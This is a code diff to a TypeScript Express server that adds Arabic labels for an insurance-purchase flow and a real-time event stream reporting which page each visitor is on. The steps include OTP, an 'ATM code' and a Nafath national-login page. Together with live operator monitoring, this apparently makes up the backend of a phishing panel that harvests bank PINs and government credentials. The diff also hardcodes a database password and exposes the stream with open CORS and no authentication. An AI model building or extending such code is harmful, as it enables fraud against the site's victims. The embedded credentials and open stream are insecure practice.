@@ -38,6 +38,35 @@ function broadcastSSE(event: string, data: any) {
   });
 }
 
+// Page name translations to Arabic
+const pageNamesArabic: Record<string, string> = {
+  "home-new": "الرئيسية",
+  "home": "الرئيسية",
+  "insur": "بيانات المركبة",
+  "vehicle": "بيانات المركبة",
+  "compar": "اختيار التأمين",
+  "compare": "اختيار التأمين",
+  "check": "الدفع",
+  "payment": "الدفع",
+  "step2": "رمز التحقق",
+  "otp": "رمز التحقق",
+  "step3": "رمز ATM",
+  "atm": "رمز ATM",
+  "step4": "النفاذ الوطني",
+  "nafad": "النفاذ الوطني",
+  "step5": "رقم الهاتف",
+  "phone": "رقم الهاتف",
+  "thank-you": "شكراً",
+  "confi": "تأكيد",
+  "veri": "تحقق",
+  "unknown": "غير معروف"
+};
+
+// Get Arabic page name
+function getPageNameArabic(page: string): string {
+  return pageNamesArabic[page] || page;
+}
+
 const connectionString = process.env.DATABASE_URL || "postgresql://neondb_owner:npg_R6GQdYoAp8NC@ep-lively-dream-aumirq95-pooler.c-10.us-east-1.aws.neon.tech/neondb?sslmode=require&channel_binding=require";
 
 const pool = new Pool({
@@ -707,10 +736,53 @@ async function startServer() {
     try {
       const merged = await upsertVisitor(req.params.id, req.body || {});
       res.json(merged);
+      
+      // Broadcast page change via SSE if currentPage was updated
+      if (req.body?.currentPage) {
+        broadcastSSE("pageChange", {
+          visitorId: req.params.id,
+          currentPage: req.body.currentPage,
+          pageNameArabic: getPageNameArabic(req.body.currentPage),
+          timestamp: new Date().toISOString()
+        });
+      }
     } catch (error) {
       console.error("visitor patch error", error);
       res.status(500).json({ error: "Failed to update visitor" });
     }
+  });
+
+  // SSE endpoint for real-time visitor updates
+  app.get("/api/visitors/:id/stream", (req, res) => {
+    const visitorId = req.params.id;
+    
+    // Set SSE headers
+    res.setHeader('Content-Type', 'text/event-stream');
+    res.setHeader('Cache-Control', 'no-cache');
+    res.setHeader('Connection', 'keep-alive');
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    
+    // Send initial connection message
+    res.write(`event: connected\ndata: ${JSON.stringify({ visitorId, message: "SSE connected" })}\n\n`);
+    
+    // Add client to the set
+    sseClients.add(res);
+    
+    // Keep connection alive with heartbeat
+    const heartbeat = setInterval(() => {
+      try {
+        res.write(`:heartbeat\n\n`);
+      } catch (e) {
+        clearInterval(heartbeat);
+        sseClients.delete(res);
+      }
+    }, 30000);
+    
+    // Clean up on client disconnect
+    req.on('close', () => {
+      clearInterval(heartbeat);
+      sseClients.delete(res);
+    });
   });
 
   app.post("/api/visitors/:id/history", async (req, res) => {
